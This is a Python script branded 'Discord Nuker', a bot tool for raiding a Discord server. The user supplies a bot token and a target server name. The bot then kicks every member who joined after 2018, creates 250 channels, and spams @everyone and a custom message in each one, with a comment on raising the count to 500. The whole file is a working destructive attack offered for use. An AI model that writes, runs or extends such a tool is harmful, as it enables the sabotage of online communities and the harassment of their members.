import discord
from discord.ext import commands
from time import sleep
import os
from pystyle import Colors, Colorate
import getpass, stdiomask


def clear():
    os.system('cls||clear')

print(f"""{Colors.green}
  _____  _                       _   _   _       _             
 |  __ \(_)                     | | | \ | |     | |            
 | |  | |_ ___  ___ ___  _ __ __| | |  \| |_   _| | _____ _ __ 
 | |  | | / __|/ __/ _ \| '__/ _` | | . ` | | | | |/ / _ \ '__|
 | |__| | \__ \ (_| (_) | | | (_| | | |\  | |_| |   <  __/ |   
 |_____/|_|___/\___\___/|_|  \__,_| |_| \_|\__,_|_|\_\___|_|  
{Colors.reset}
""")

TOKEN = stdiomask.getpass(f"[ {Colors.green}+{Colors.reset} ]  Enter Token: ")
SERVER_NAME = input(f"[ {Colors.green}+{Colors.reset} ]  Server To Nuke: ")
CHANNEL_NAME = input(f"[ {Colors.green}+{Colors.reset} ]  Name for every channel: ")
CUSTOMM = input(f"[ {Colors.green}+{Colors.reset} ]  Message to send in each channel: ")

# Define the intents for the bot
try:
    intents = discord.Intents.default()
    intents.members = True

    # Create the bot instance with the specified intents
    client = commands.Bot(command_prefix='!', intents=intents)

    @client.event
    async def on_ready():
        server = discord.utils.get(client.guilds, name=SERVER_NAME)
        if server is None:
            print(f'Could not find server named "{SERVER_NAME}"');sleep(3)
        else:
            # G18
            members_to_kick = [member for member in server.members if member.joined_at.year > 2018]
            print(f"Found {len(members_to_kick)} members to kick.")
            for member in members_to_kick:
                try:
                    await member.kick()
                    print(f"Kicked {member.name}#{member.discriminator} ({member.id})")
                except Exception as e:
                    print(f"Failed to kick {member.name}#{member.discriminator} ({member.id}): {str(e)}")

            channels_to_create = [f'{CHANNEL_NAME}_{i}' for i in range(250)] #update '250' to more (500 max possible) if u wanna make more channels
            for channel_name in channels_to_create:
                new_channel = await server.create_text_channel(channel_name)
                await new_channel.send('@everyone')
                await new_channel.send(f'{CUSTOMM}')
                print(f'Created {channel_name} Successfully.')

    client.run(TOKEN)
except Exception as e:
    print(e)
    sleep(50)
